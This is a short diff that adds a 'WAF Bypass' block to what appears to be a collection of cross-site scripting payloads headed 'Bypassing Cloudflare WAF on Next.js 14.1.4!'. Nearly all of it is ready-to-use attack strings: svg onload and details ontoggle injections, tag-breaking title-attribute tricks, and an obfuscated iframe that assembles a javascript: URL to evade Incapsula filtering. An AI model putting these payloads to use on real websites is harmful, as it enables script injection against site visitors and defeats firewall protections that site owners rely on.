@@ -3,6 +3,14 @@ Bypassing Cloudflare WAF on Next.js 14.1.4!
 ‘>alert(154)<​/script><​script/154=’;;;;;;;
 
 
+WAF Bypass:
+-----------
+<acronym><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+<bgsound><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+<xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+">'><details/open/ontoggle​=confirm('XSS')>
+incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
+
 
 Cloudflare WAF Payload:
 -----------------------
